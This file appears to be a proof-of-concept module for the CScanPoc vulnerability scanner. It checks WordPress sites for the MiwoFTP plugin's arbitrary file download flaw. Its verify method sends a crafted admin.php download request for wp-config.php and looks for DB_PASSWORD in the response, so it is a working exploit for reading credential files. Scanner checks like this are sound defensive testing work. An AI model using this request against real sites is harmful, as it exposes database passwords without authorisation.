# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib
import urllib2

class Vuln(ABVuln):
    vuln_id = 'WordPress_MiwoFTP_0005'  # 平台漏洞编号，留空
    name = 'WordPress MiwoFTP 任意文件下载漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-04-21'  # 漏洞公布时间
    desc = '''
        WordPress MiwoFTP Plugin <= 1.0.5 - Arbitrary File Download.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36801/'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'Wordpress'  # 漏洞应用名称
    product_version = 'WordPress MiwoFTP Plugin <= 1.0.5'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f32ea28d-54b4-4d04-8862-0a0156809dd2'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download'
                       '&item=wp-config.php&order=name&srt=yes')
            verify_url = self.target + payload
            request = urllib2.Request(verify_url)

            response = urllib2.urlopen(request)
            reg = re.compile("DB_PASSWORD")
            if reg.findall(response.read()):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
